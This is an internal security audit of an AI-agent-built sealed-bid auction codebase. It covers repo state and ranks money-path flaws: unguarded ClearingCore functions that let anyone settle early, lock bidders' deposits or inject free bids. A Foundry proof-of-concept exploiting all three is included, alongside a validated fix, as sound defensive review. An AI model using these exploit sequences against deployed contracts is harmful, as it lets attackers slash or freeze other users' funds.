# AUDIT — repo state and money-path review, 22 Sep 2026

What the agent crew built, what is merged, and what is wrong with the money path, ranked by severity. Every critical finding has a proof-of-concept that passes against the real code.

Status: draft

## Where the repo stands

| Branch / worktree | Agent (actual model) | State | Tests |
| --- | --- | --- | --- |
| `master` | — | `SealingLayer`, `DepositLedger`, `ClearingCore` merged | 12 pass |
| `agent/fork` | muse | `AuctionEngine.sol` + tests **uncommitted** | 17 pass |
| `agent/core` | codex | `LPSeeder.sol`, `ExitAdapter.sol` + tests **uncommitted** | 17 pass |
| `agent/settle` | opencode — **`opencode-go/deepseek-v4-pro`**, not GPT-5.6 sol as planned | `SettleInvariants.t.sol` **uncommitted** | 13 pass, but see M2 |
| `agent/ui` | opencode — `opencode-go/glm-5.3` | `web/` **uncommitted** | `selftest.mjs` |
| `agent/scripts` | opencode — `opencode-go/glm-5.3-flash` | deploy, fee probe, indexer **uncommitted** | `indexer.test.mjs`, `e2e.test.mjs` |
| `agent/demo` | grok | `demo/` **uncommitted** | 10 pass |

Two things to fix before anything else:

- **Commit the worktrees.** Almost all of the work exists only as uncommitted files. One `git worktree remove --force` loses it.
- **Delete `web/`, `indexer/` and `contracts/script/` from `master`.** They are untracked and are a *different, older* implementation than the `ui` and `scripts` worktrees (different file sets). Merging on top of them produces two frontends. Likely cause: `run.sh` falls back to pane `w1:p1` for `core` without changing into the core worktree, so at least one agent ran in `master`'s directory.

## What is right

- Commit preimage is exactly `keccak256(abi.encode(price, quantity, salt, msg.sender))` in both the contract and the frontend's `commitHash.js`. Bugs #1 and #2 are closed.
- The deposit ledger asserts `locked == appliedToFill + refunded + slashed` on every settle path, updates state before sending value, and guards against reentrancy. Bugs #3 (in isolation) and #5 are closed.
- The clearing loop in `ClearingCore.sol` matches upstream EasyAuction line for line: the settle `do/while`, branches `[13]`–`[16]`, and the claim math. The off-by-one comments are thorough. Bug #4 is closed *in the math*.
- The `minBidSize - 1` hand-off between the sealing layer (`>=`) and the core (`>`) is correct and well reasoned: no bidder can commit to a bid the core will later reject.
- Uniform deposit and total volume `< 2^96` are enforced.
- No forbidden wording anywhere in the UI, demo or indexer. The frontend uses the exact "snipe-resistant" line.

## Critical

All three share one root cause, and one fix closes all three.

**Root cause.** `ClearingCore` is deployed as its own contract, and `AuctionEngine` calls it. None of the core's state-changing functions check the caller. The port also dropped upstream's time check (`atStageSolutionSubmission` required `block.timestamp >= auctionEndDate`). The engine enforces commit and reveal windows, but anyone can go around the engine and call the core directly.

### C1 — Anyone can settle during the commit window; every honest bidder is slashed

`core.settleAuction(coreRoundId)` has no caller or time check. After it runs, `placeSellOrdersOnBehalf` reverts with `"round already settled"`, so every `reveal` reverts. At `revealEnd`, `slashUnrevealed` takes 100% of every deposit. Round ids are sequential and public. The attack costs one transaction per round.

### C2 — Anyone can permanently lock any bidder's deposit

`core.claimFromParticipantOrder` removes the orders it is given and returns amounts without paying anyone. That was safe upstream, where the function transferred tokens to the order owner. Here the transfers were removed, so a third-party call destroys the order. The victim's `engine.claim` then reverts with `"order is no longer claimable"` forever, and the deposit cannot be slashed either, because the bidder revealed. Every field of the order encoding is public through `Revealed` events.

### C3 — Anyone can place bids without committing or depositing

`core.placeSellOrders` accepts orders from anyone, with no commitment and no money. A phantom order outbids and absorbs the whole supply, so honest bidders get zero fill. It also reopens bug #6: dust-order spam is now free, so the minimum bid size no longer protects settlement. `placeSellOrdersOnBehalf` lets the attacker attribute orders to other people's addresses, `cancelSellOrders` lets a revealed bidder withdraw after seeing everyone else's bids, and `setFeeParameters` is also open.

### Fix — validated

Give the core one authorised caller, and have the engine deploy its own core so there is no chicken-and-egg:

```solidity
// ClearingCore.sol
address public immutable engine;

modifier onlyEngine() {
    require(msg.sender == engine, "only engine");
    _;
}

constructor(...) {
    engine = msg.sender;
    // ...
}
// add onlyEngine to: createRound, placeSellOrders, placeSellOrdersOnBehalf,
// cancelSellOrders, precalculateSellAmountSum, settleAuction,
// settleAuctionAtomically, claimFromParticipantOrder, setFeeParameters
```

```solidity
// AuctionEngine.sol — constructor takes the core's minimum floor instead of its address
core = new ClearingCore(coreMinimumFloor_, 0, address(0));
```

Validated on a scratch copy of `agent/fork`:

| Suite | Before fix | After fix |
| --- | --- | --- |
| PoC 1–3 (below) | all 3 exploits succeed | all 3 blocked: `"only engine"` |
| `AuctionEngineTest` (full lifecycle) | 5 pass | 5 pass |
| `SealingLayerTest` | 6 pass | 6 pass |
| `ClearingCoreTest` | 6 pass | 6 fail — the tests impersonate bidders with `vm.prank` and call the core directly. Change them to call `placeSellOrdersOnBehalf(..., who)` from the deploying test contract. Mechanical. |

Once the fix lands, keep the three PoCs as regression tests, flipped to `vm.expectRevert("only engine")`.

### Proof of concept

Runs against `agent/fork` as-is: `forge test --match-contract PoC`. All three pass, which means all three attacks work.

```solidity
// SPDX-License-Identifier: LGPL-3.0
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/AuctionEngine.sol";
import "../src/ClearingCore.sol";

contract PoC is Test {
    ClearingCore core;
    AuctionEngine engine;
    address payable slashDest = payable(address(0x51A5));
    address payable fillDest = payable(address(0xF111));
    address alice = address(0xA11CE);
    address attacker = address(0xBAD);
    uint256 constant DEPOSIT = 200;

    function setUp() public {
        vm.warp(1000);
        core = new ClearingCore(10, 0, address(0));
        engine = new AuctionEngine(address(core), slashDest, fillDest, 1000, false, 1, 100, 0, true);
        vm.deal(alice, 1000);
    }

    function _open() internal returns (uint256) {
        return engine.openRound(AuctionEngine.Preset.Degen, address(0xA9C7), address(0xB1D6),
            1000, 11, DEPOSIT, 1100, 1200, bytes32(0), false);
    }

    function _commit(uint256 r, uint96 p, uint96 q) internal {
        vm.prank(alice);
        engine.commit{value: DEPOSIT}(r, keccak256(abi.encode(p, q, bytes32("s"), alice)));
    }

    function test_PoC1_settleDuringCommit_slashesHonestBidders() public {
        uint256 r = _open();
        _commit(r, 50, 100);
        vm.prank(attacker);
        core.settleAuction(engine.coreRoundIds(r));
        vm.warp(1100);
        vm.prank(alice);
        vm.expectRevert("round already settled");
        engine.reveal(r, 50, 100, bytes32("s"));
        vm.warp(1200);
        address[] memory who = new address[](1); who[0] = alice;
        engine.slashUnrevealed(r, who);
        assertEq(slashDest.balance, DEPOSIT);
    }

    function test_PoC2_frontrunClaim_locksFundsForever() public {
        uint256 r = _open();
        _commit(r, 50, 100);
        vm.warp(1100);
        vm.prank(alice);
        engine.reveal(r, 50, 100, bytes32("s"));
        vm.warp(1200);
        engine.settle(r);
        (,, uint64 uid,) = engine.bids(r, alice);
        bytes32[] memory o = new bytes32[](1);
        o[0] = IterableOrderedOrderSet.encodeOrder(uid, 50, 100);
        vm.prank(attacker);
        core.claimFromParticipantOrder(engine.coreRoundIds(r), o);
        vm.prank(alice);
        vm.expectRevert("order is no longer claimable");
        engine.claim(r);
        address[] memory who = new address[](1); who[0] = alice;
        vm.expectRevert("not slashable");
        engine.slashUnrevealed(r, who);
        assertEq(address(engine).balance, DEPOSIT);
    }

    function test_PoC3_freeOrderInjection_crowdsOutHonestBidder() public {
        uint256 r = _open();
        _commit(r, 50, 100);
        vm.warp(1100);
        vm.prank(alice);
        engine.reveal(r, 50, 100, bytes32("s"));
        uint96[] memory buy = new uint96[](1); buy[0] = 1000;
        uint96[] memory sell = new uint96[](1); sell[0] = 1e20;
        bytes32[] memory prev = new bytes32[](1); prev[0] = IterableOrderedOrderSet.QUEUE_START;
        vm.prank(attacker);
        core.placeSellOrders(engine.coreRoundIds(r), buy, sell, prev);
        vm.warp(1200);
        engine.settle(r);
        vm.prank(alice);
        engine.claim(r);
        assertEq(engine.fillEntitlement(r, alice), 0);
        assertEq(alice.balance, 1000);
    }
}
```

## High

### H1 — Winners pay and receive no tokens

`openRound` never takes custody of the supply, and `claim` writes `fillEntitlement[roundId][bidder]` but transfers nothing. There is also no creator-side claim: no proceeds, no unsold supply returned. The "bidder gets tokens" half of the money path does not exist yet, and a creator can open a round for tokens they do not hold. `AuctionEngine.sol` flags this as a TODO; it is listed here because it is P0 for the demo.

### H2 — `price` means "tokens wanted", but the UI asks for a price

**Decided 22 Sep:** `price` is the max price per token, plus a separate token `amount` (10-decisions.md #22). Proposed follow-up: Zama-style clearing with price + amount (decision 22), which also fixes M6 and removes C1–C3 by construction. Briefs: `tasks/clearing.md` and `tasks/ui-bid.md`.

`_placeOrder` maps `reveal(price, quantity)` to `order(buyAmount = price, sellAmount = quantity)`. So `price` is the number of auctioning tokens the bidder wants, and the real limit price is `quantity / price`. The frontend (`ui` worktree, `screens/round.js`) labels the field "Price" and suggests a raw `1000000000000000000`. A bid entered that way is malformed. Rename it `buyAmount` / "tokens you want" end to end, or convert inside `_placeOrder`. **Decide before either side ships**: the field is part of the committed hash preimage, so the contract and UI must change together.

### H3 — `biddingToken` is stored and ignored

Deposits and fills are native MON, but `openRound` accepts any `biddingToken` address and never uses it. A creator who passes an ERC-20 gets amounts interpreted in the wrong unit. Until ERC-20 bidding exists, `require(biddingToken == address(0))`.

## Medium

- **M1 — Test harness compiled into production source.** `src/SealingLayer.sol` imports `forge-std` and defines `SealingLayerTest`. My brief caused this: `tasks/core.md` restricted the agent to two `src/` paths and also asked for tests. Move it to `test/SealingLayer.t.sol`.
- **M2 — The `settle` suite tests mocks, not your contracts.** Its 13 passing tests exercise `LedgerModel`, `AllocationModel`, `PayoutModel` and others, defined inside the test file. They never touch `SealingLayer`, `DepositLedger`, `ClearingCore` or `AuctionEngine`, so real coverage of bugs #3, #4, #5 and #8 from that suite is zero. The branch it ran on still has the 5-line stub `ClearingCore`. Rerun it against `agent/fork` once merged, with the instruction to import `../src/AuctionEngine.sol`.
- **M3 — The demo's auction side is simulated in JavaScript.** The bonding curve and sniper bot are real Solidity, but the auction is `clearAuction()` in `demo/harness.js`, about 20 lines. If a judge asks "is that your contract?", the answer today is no. Point the auction pane at a real `AuctionEngine` on local anvil.
- **M4 — Reserve price is engine-wide.** `reserveMinBuyAmount` is one immutable for every round, but the core's reserve price is `minBuyAmount / sellAmount`, so the effective reserve changes with each round's `sellAmount`. Move it into `openRound`.
- **M5 — Commitment hash has no domain separation.** The preimage lacks `roundId`, `address(this)` and `block.chainid`. It is not exploitable today, because only the committing sender can reveal, but a salt reused across rounds becomes linkable. Adding the fields changes the four-field spec in `AGENTS.md`, so it is your call, not an agent's.

- **M6 — At the clearing price, earlier revealers win ties.** `smallerThan` orders equal-price bids by order size, then by `userId`, and the core assigns `userId` on first contact, which for bidders is their reveal. So among equal bids at the clearing price, whoever revealed first gets filled and the rest get refunds. That contradicts "submission timing no longer determines price" at exactly the bids that matter. Fixed by decision 22's pro-rata rule.

## Low / hygiene

- `LPSeeder.sol` is abstract with DEX hooks, as expected: the DEX is still undecided (Q4). Bug #7 (sandwichable seed) is therefore still open.
- `ExitAdapter.sol` (190 lines) is untested against a real vault. Expected: Q6 is still open.
- `run.sh` writes a pane's model only if `opencode.json` is missing, so the files that exist now win. That is how `settle` ended up on DeepSeek. Delete the three `opencode.json` files before a rerun if you want the planned models.

## Next steps, in order

1. Commit every worktree, then delete `master`'s stray `web/`, `indexer/`, `contracts/script/`.
2. Merge `agent/fork` into `master`.
3. Decide Q14. If yes: `tasks/clearing.md` replaces `ClearingCore` and C1–C3 disappear with it. If no: apply the C1–C3 fix above.
4. Decide H2: the name and meaning of `price`.
5. Implement the token leg (H1). This needs the DEX / LP-lock answer (Q4).
6. Move the test harness out of `src/` (M1). Point the `settle` agent at the real contracts (M2) and the demo at the real engine (M3).
7. Run `agentguard scan`, then send the diff of steps 3 and 5 back for review.

Related files: [RUNBOOK.md](RUNBOOK.md) · [AGENTS.md](AGENTS.md) · [06-api.md](06-api.md) · [11-roadmap.md](11-roadmap.md) · [12-open-questions.md](12-open-questions.md)
